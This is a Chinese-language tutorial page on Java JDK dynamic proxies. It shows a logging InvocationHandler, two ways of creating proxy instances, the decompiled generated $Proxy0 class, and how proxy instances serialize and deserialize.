<h4 id="com-y5neko-sec-proxy-UnixFileSystem"><a href="#com-y5neko-sec-proxy-UnixFileSystem" class="headerlink" title="com.y5neko.sec.proxy.UnixFileSystem"></a>com.y5neko.sec.proxy.UnixFileSystem</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko.sec.proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UnixFileSystem</span> <span class="keyword">implements</span> <span class="title class_">FileSystem</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* -- Disk usage -- */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="variable">spaceTotal</span> <span class="operator">=</span> <span class="number">996</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String[] list(File file) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;正在执行[&quot;</span> + <span class="built_in">this</span>.getClass().getName() + <span class="string">&quot;]类的list方法，参数:[&quot;</span> + file + <span class="string">&quot;]&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> file.list();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="com-y5neko-sec-proxy-JDKInvocationHandler"><a href="#com-y5neko-sec-proxy-JDKInvocationHandler" class="headerlink" title="com.y5neko.sec.proxy.JDKInvocationHandler"></a>com.y5neko.sec.proxy.JDKInvocationHandler</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko.sec.proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JDKInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span>, Serializable &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object target;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">JDKInvocationHandler</span><span class="params">(Object target)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.target = target;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="comment">// 为了不影响测试Demo的输出结果，这里忽略掉toString方法</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;toString&quot;</span>.equals(method.getName())) &#123;</span><br><span class="line">            <span class="keyword">return</span> method.invoke(target, args);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;即将调用[&quot;</span> + target.getClass().getName() + <span class="string">&quot;]类的[&quot;</span> + method.getName() + <span class="string">&quot;]方法...&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> method.invoke(target, args);</span><br><span class="line">        System.out.println(<span class="string">&quot;已完成[&quot;</span> + target.getClass().getName() + <span class="string">&quot;]类的[&quot;</span> + method.getName() + <span class="string">&quot;]方法调用...&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="Proxy-newProxyInstance创建动态代理类实例"><a href="#Proxy-newProxyInstance创建动态代理类实例" class="headerlink" title="Proxy.newProxyInstance创建动态代理类实例"></a>Proxy.newProxyInstance创建动态代理类实例</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Copyright (c) 2023. Lorem ipsum dolor sit amet, consectetur adipiscing elit.</span></span><br><span class="line"><span class="comment"> * Morbi non lorem porttitor neque feugiat blandit. Ut vitae ipsum eget quam lacinia accumsan.</span></span><br><span class="line"><span class="comment"> * Etiam sed turpis ac ipsum condimentum fringilla. Maecenas magna.</span></span><br><span class="line"><span class="comment"> * Proin dapibus sapien vel ante. Aliquam erat volutpat. Pellentesque sagittis ligula eget metus.</span></span><br><span class="line"><span class="comment"> * Vestibulum commodo. Ut rhoncus gravida arcu.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.y5neko.sec.proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestProxyInstance</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 创建UnixFileSystem类实例</span></span><br><span class="line">        <span class="type">FileSystem</span> <span class="variable">fileSystem</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnixFileSystem</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用JDK动态代理生成FileSystem动态代理类实例</span></span><br><span class="line">        <span class="type">FileSystem</span> <span class="variable">proxyInstance</span> <span class="operator">=</span> (FileSystem) Proxy.newProxyInstance(</span><br><span class="line">                FileSystem.class.getClassLoader(),<span class="comment">// 指定动态代理类的类加载器为FileSystem类的加载器</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;FileSystem.class&#125;,<span class="comment">// 定义动态代理生成的类实现的接口</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">JDKInvocationHandler</span>(fileSystem)<span class="comment">// 动态代理处理类</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        System.out.println(proxyInstance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/image/image-20230714230336690.png" alt="image-20230714230336690" style="zoom:80%;" />

<h4 id="Proxy-getProxyClass反射创建动态代理类实例"><a href="#Proxy-getProxyClass反射创建动态代理类实例" class="headerlink" title="Proxy.getProxyClass反射创建动态代理类实例"></a>Proxy.getProxyClass反射创建动态代理类实例</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Copyright (c) 2023. Lorem ipsum dolor sit amet, consectetur adipiscing elit.</span></span><br><span class="line"><span class="comment"> * Morbi non lorem porttitor neque feugiat blandit. Ut vitae ipsum eget quam lacinia accumsan.</span></span><br><span class="line"><span class="comment"> * Etiam sed turpis ac ipsum condimentum fringilla. Maecenas magna.</span></span><br><span class="line"><span class="comment"> * Proin dapibus sapien vel ante. Aliquam erat volutpat. Pellentesque sagittis ligula eget metus.</span></span><br><span class="line"><span class="comment"> * Vestibulum commodo. Ut rhoncus gravida arcu.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.y5neko.sec.proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestGetProxyClass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        <span class="comment">// 创建UnixFileSystem类实例</span></span><br><span class="line">        <span class="type">FileSystem</span> <span class="variable">fileSystem</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnixFileSystem</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建动态代理处理类</span></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JDKInvocationHandler</span>(fileSystem);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 通过指定类加载器、类实现的接口数组生成一个动态代理类</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">proxyClass</span> <span class="operator">=</span> Proxy.getProxyClass(</span><br><span class="line">                FileSystem.class.getClassLoader(),<span class="comment">// 指定动态代理类的类加载器</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;FileSystem.class&#125;<span class="comment">// 定义动态代理生成的类实现的接口</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用反射获取Proxy类构造器并创建动态代理类实例</span></span><br><span class="line">        <span class="type">FileSystem</span> <span class="variable">proxyInstance</span> <span class="operator">=</span> (FileSystem) proxyClass.getConstructor(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;InvocationHandler.class&#125;).newInstance(<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;handler&#125;</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        System.out.println(proxyInstance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/image/image-20230714230458364.png" alt="image-20230714230458364" style="zoom:80%;" />

<h3 id="动态代理添加方法调用日志示例"><a href="#动态代理添加方法调用日志示例" class="headerlink" title="动态代理添加方法调用日志示例"></a>动态代理添加方法调用日志示例</h3><p>假设我们有一个叫做<code>FileSystem</code>接口，<code>UnixFileSystem</code>类实现了<code>FileSystem</code>接口，我们可以使用<code>JDK动态代理</code>的方式给<code>FileSystem</code>的接口方法执行前后都添加日志输出。</p>
<h4 id="FileSystemProxyTest"><a href="#FileSystemProxyTest" class="headerlink" title="FileSystemProxyTest"></a>FileSystemProxyTest</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Copyright (c) 2023. Lorem ipsum dolor sit amet, consectetur adipiscing elit.</span></span><br><span class="line"><span class="comment"> * Morbi non lorem porttitor neque feugiat blandit. Ut vitae ipsum eget quam lacinia accumsan.</span></span><br><span class="line"><span class="comment"> * Etiam sed turpis ac ipsum condimentum fringilla. Maecenas magna.</span></span><br><span class="line"><span class="comment"> * Proin dapibus sapien vel ante. Aliquam erat volutpat. Pellentesque sagittis ligula eget metus.</span></span><br><span class="line"><span class="comment"> * Vestibulum commodo. Ut rhoncus gravida arcu.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.y5neko.sec.proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FileSystemProxyTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//创建UnixFileSystem类实例</span></span><br><span class="line">        <span class="type">FileSystem</span> <span class="variable">fileSystem</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnixFileSystem</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//使用JDK动态代理生成FileSystem动态代理类实例</span></span><br><span class="line">        <span class="type">FileSystem</span> <span class="variable">proxyInstance</span> <span class="operator">=</span> (FileSystem) Proxy.newProxyInstance(</span><br><span class="line">                FileSystem.class.getClassLoader(),<span class="comment">// 指定动态代理类的类加载器</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;FileSystem.class&#125;, <span class="comment">// 定义动态代理生成的类实现的接口</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">JDKInvocationHandler</span>(fileSystem)<span class="comment">// 动态代理处理类，此时通过UnixFileSystem类代理FileSystem</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;动态代理生成的类名:&quot;</span> + proxyInstance.getClass());</span><br><span class="line">        System.out.println(<span class="string">&quot;----------------------------------------------------------------------------------------&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;动态代理生成的实例名:&quot;</span> + proxyInstance);</span><br><span class="line">        System.out.println(<span class="string">&quot;----------------------------------------------------------------------------------------&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用动态代理的方式UnixFileSystem方法</span></span><br><span class="line">        String[] files = proxyInstance.list(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;.&quot;</span>));</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;----------------------------------------------------------------------------------------&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;UnixFileSystem.list方法执行结果:&quot;</span> + Arrays.toString(files));</span><br><span class="line">        System.out.println(<span class="string">&quot;----------------------------------------------------------------------------------------&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isFileSystem</span>     <span class="operator">=</span> proxyInstance <span class="keyword">instanceof</span> FileSystem;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isUnixFileSystem</span> <span class="operator">=</span> proxyInstance <span class="keyword">instanceof</span> UnixFileSystem;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;动态代理类[&quot;</span> + proxyInstance.getClass() + <span class="string">&quot;]是否是FileSystem类的实例:&quot;</span> + isFileSystem);</span><br><span class="line">        System.out.println(<span class="string">&quot;----------------------------------------------------------------------------------------&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;动态代理类[&quot;</span> + proxyInstance.getClass() + <span class="string">&quot;]是否是UnixFileSystem类的实例:&quot;</span> + isUnixFileSystem);</span><br><span class="line">        System.out.println(<span class="string">&quot;----------------------------------------------------------------------------------------&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/image/image-20230714232550885.png" alt="image-20230714232550885" style="zoom:80%;" />

<p>我们来分析一下整个调用流程</p>
<ul>
<li>首先创建了一个UnixFileSystem类的实例，用以JDKInvocationHandler动态处理类代理</li>
<li>接着使用JDK动态代理生成FileSystem动态代理类实例，因此动态代理生成的类名和实例名分别是<code>class com.sun.proxy.$Proxy0</code>和<code>com.y5neko.sec.proxy.UnixFileSystem@29453f44</code></li>
<li>使用动态代理的方式执行<code>list</code>方法，实际上执行的是<code>UnixFileSystem</code>类的list方法，并且通过JDK动态代理的invoke方法覆写了<code>InvocationHandler</code>类的invoke方法，增加了前后和执行中的日志输出</li>
</ul>
<img src="/image/image-20230714235516874.png" alt="image-20230714235516874" style="zoom:80%;" />

<img src="/image/image-20230714235319076.png" alt="image-20230714235319076" style="zoom:80%;" />

<img src="/image/image-20230714235432821.png" alt="image-20230714235432821" style="zoom:80%;" />

<img src="/image/image-20230715000834139.png" alt="image-20230715000834139" style="zoom:80%;" />

<ul>
<li>接着判断动态代理类<code>com.sun.proxy.$Proxy0</code>属于哪个类的实例</li>
<li>注意此处结果，第一个为true，第二个为false，因为proxyInstance本身是FileSystem类，但是使用了UnixFileSystem类作为动态代理</li>
</ul>
<h3 id="动态代理类生成的-ProxyXXX类代码分析"><a href="#动态代理类生成的-ProxyXXX类代码分析" class="headerlink" title="动态代理类生成的$ProxyXXX类代码分析"></a>动态代理类生成的$ProxyXXX类代码分析</h3><p><code>java.lang.reflect.Proxy</code>类是通过创建一个新的<code>Java类(类名为com.sun.proxy.$ProxyXXX)</code>的方式来实现无侵入的类方法代理功能的。</p>
<p><strong>动态代理生成出来的类有如下技术细节和特性：</strong></p>
<ol>
<li>动态代理的必须是接口类，通过<code>动态生成一个接口实现类</code>来代理接口的方法调用(<code>反射机制</code>)。</li>
<li>动态代理类会由<code>java.lang.reflect.Proxy.ProxyClassFactory</code>创建。</li>
<li><code>ProxyClassFactory</code>会调用<code>sun.misc.ProxyGenerator</code>类生成该类的字节码，并调用<code>java.lang.reflect.Proxy.defineClass0()</code>方法将该类注册到<code>JVM</code>。</li>
<li>该类继承于<code>java.lang.reflect.Proxy</code>并实现了需要被代理的接口类，因为<code>java.lang.reflect.Proxy</code>类实现了<code>java.io.Serializable</code>接口，所以被代理的类支持<code>序列化/反序列化</code>。</li>
<li>该类实现了代理接口类(示例中的接口类是<code>com.y5neko.sec.proxy.FileSystem</code>)，会通过<code>ProxyGenerator</code>动态生成接口类(<code>FileSystem</code>)的所有方法，</li>
<li>该类因为实现了代理的接口类，所以当前类是代理的接口类的实例(<code>proxyInstance instanceof FileSystem</code>为<code>true</code>)，但不是代理接口类的实现类的实例(<code>proxyInstance instanceof UnixFileSystem</code>为<code>false</code>)。</li>
<li>该类方法中包含了被代理的接口类的所有方法，通过调用动态代理处理类(<code>InvocationHandler</code>)的<code>invoke</code>方法获取方法执行结果。</li>
<li>该类代理的方式重写了<code>java.lang.Object</code>类的<code>toString</code>、<code>hashCode</code>、<code>equals</code>方法。</li>
<li>如果动过动态代理生成了多个动态代理类，新生成的类名中的<code>0</code>会自增，如<code>com.sun.proxy.$Proxy0/$Proxy1/$Proxy2</code>。</li>
</ol>
<p><strong>动态代理生成的<code>com.sun.proxy.$Proxy0</code>类代码：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.sun.proxy.$Proxy0;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.UndeclaredThrowableException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">$Proxy0</span> <span class="keyword">extends</span> <span class="title class_">Proxy</span> <span class="keyword">implements</span> <span class="title class_">FileSystem</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Method m1;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 实现的FileSystem接口方法，如果FileSystem里面有多个方法那么在这个类中将从m3开始n个成员变量</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Method m3;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Method m0;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Method m2;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $Proxy0(InvocationHandler var1) &#123;</span><br><span class="line">        <span class="built_in">super</span>(var1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object var1)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> (Boolean) <span class="built_in">super</span>.h.invoke(<span class="built_in">this</span>, m1, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;var1&#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException | Error var3) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var3;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable var4) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UndeclaredThrowableException</span>(var4);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> String[] list(File var1) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> (String[]) <span class="built_in">super</span>.h.invoke(<span class="built_in">this</span>, m3, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;var1&#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException | Error var3) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var3;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable var4) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UndeclaredThrowableException</span>(var4);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> (Integer) <span class="built_in">super</span>.h.invoke(<span class="built_in">this</span>, m0, (Object[]) <span class="literal">null</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException | Error var2) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var2;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable var3) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UndeclaredThrowableException</span>(var3);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> (String) <span class="built_in">super</span>.h.invoke(<span class="built_in">this</span>, m2, (Object[]) <span class="literal">null</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException | Error var2) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var2;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable var3) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UndeclaredThrowableException</span>(var3);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            m1 = Class.forName(<span class="string">&quot;java.lang.Object&quot;</span>).getMethod(<span class="string">&quot;equals&quot;</span>, Class.forName(<span class="string">&quot;java.lang.Object&quot;</span>));</span><br><span class="line">            m3 = Class.forName(<span class="string">&quot;com.y5neko.sec.proxy.FileSystem&quot;</span>).getMethod(<span class="string">&quot;list&quot;</span>, Class.forName(<span class="string">&quot;java.io.File&quot;</span>));</span><br><span class="line">            m0 = Class.forName(<span class="string">&quot;java.lang.Object&quot;</span>).getMethod(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">            m2 = Class.forName(<span class="string">&quot;java.lang.Object&quot;</span>).getMethod(<span class="string">&quot;toString&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException var2) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchMethodError</span>(var2.getMessage());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException var3) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoClassDefFoundError</span>(var3.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="动态代理类实例序列化问题"><a href="#动态代理类实例序列化问题" class="headerlink" title="动态代理类实例序列化问题"></a>动态代理类实例序列化问题</h3><p>动态代理类符合<code>Java</code>对象序列化条件，并且在<code>序列化/反序列化</code>时会被<code>ObjectInputStream/ObjectOutputStream</code>特殊处理。</p>
<h4 id="FileSystemProxySerializationTest"><a href="#FileSystemProxySerializationTest" class="headerlink" title="FileSystemProxySerializationTest"></a>FileSystemProxySerializationTest</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Copyright (c) 2023. Lorem ipsum dolor sit amet, consectetur adipiscing elit.</span></span><br><span class="line"><span class="comment"> * Morbi non lorem porttitor neque feugiat blandit. Ut vitae ipsum eget quam lacinia accumsan.</span></span><br><span class="line"><span class="comment"> * Etiam sed turpis ac ipsum condimentum fringilla. Maecenas magna.</span></span><br><span class="line"><span class="comment"> * Proin dapibus sapien vel ante. Aliquam erat volutpat. Pellentesque sagittis ligula eget metus.</span></span><br><span class="line"><span class="comment"> * Vestibulum commodo. Ut rhoncus gravida arcu.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.y5neko.sec.proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FileSystemProxySerializationTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//创建UnixFileSystem类实例</span></span><br><span class="line">            <span class="type">FileSystem</span> <span class="variable">fileSystem</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnixFileSystem</span>();</span><br><span class="line"></span><br><span class="line">            <span class="comment">//使用JDK动态代理生成FileSystem动态代理类实例</span></span><br><span class="line">            <span class="type">FileSystem</span> <span class="variable">proxyInstance</span> <span class="operator">=</span> (FileSystem) Proxy.newProxyInstance(</span><br><span class="line">                    FileSystem.class.getClassLoader(),<span class="comment">// 指定动态代理类的类</span></span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;FileSystem.class&#125;,<span class="comment">//指定动态代理实现的接口</span></span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">JDKInvocationHandler</span>(fileSystem)<span class="comment">//使用JDK动态处理类，用UnixFileSystem类代理</span></span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">            <span class="comment">//创建Java字节输出流对象</span></span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"></span><br><span class="line">            <span class="comment">//创建Java反序列化输出流对象</span></span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//序列化动态代理类</span></span><br><span class="line">            oos.writeObject(proxyInstance);</span><br><span class="line">            oos.flush();</span><br><span class="line">            oos.close();</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;序列化结果为：&quot;</span>);</span><br><span class="line">            System.out.println(baos);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 利用动态代理类生成的二进制数组创建二进制输入流对象用于反序列化操作</span></span><br><span class="line">            <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(baos.toByteArray());</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 通过反序列化输入流(bais),创建Java对象输入流(ObjectInputStream)对象</span></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 反序列化输入流数据为FileSystem对象</span></span><br><span class="line">            <span class="type">FileSystem</span> <span class="variable">test</span> <span class="operator">=</span> (FileSystem) in.readObject();</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;反序列化类实例类名:&quot;</span> + test.getClass());</span><br><span class="line">            System.out.println(<span class="string">&quot;反序列化类实例:&quot;</span> + test);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/image/image-20230717191420750.png" alt="image-20230717191420750" style="zoom:80%;" />

<p>动态代理生成的类在<code>反序列化/反序列化</code>时不会序列化该类的成员变量，并且<code>serialVersionUID</code>为<code>0L</code> ，也将是说将该类的<code>Class</code>对象传递给<code>java.io.ObjectStreamClass</code>的静态<code>lookup</code>方法时，返回的<code>ObjectStreamClass</code>实例将具有以下特性：</p>
<ol>
<li>调用其<code>getSerialVersionUID</code>方法将返回<code>0L</code> 。</li>
<li>调用其<code>getFields</code>方法将返回长度为零的数组。</li>
<li>调用其<code>getField</code>方法将返回<code>null</code> 。</li>
</ol>
<p>但其父类(<code>java.lang.reflect.Proxy</code>)在序列化时不受影响，父类中的<code>h</code>变量(<code>InvocationHandler</code>)将会被序列化，这个<code>h</code>存储了动态代理类的处理类实例以及动态代理的接口类的实现类的实例。</p>
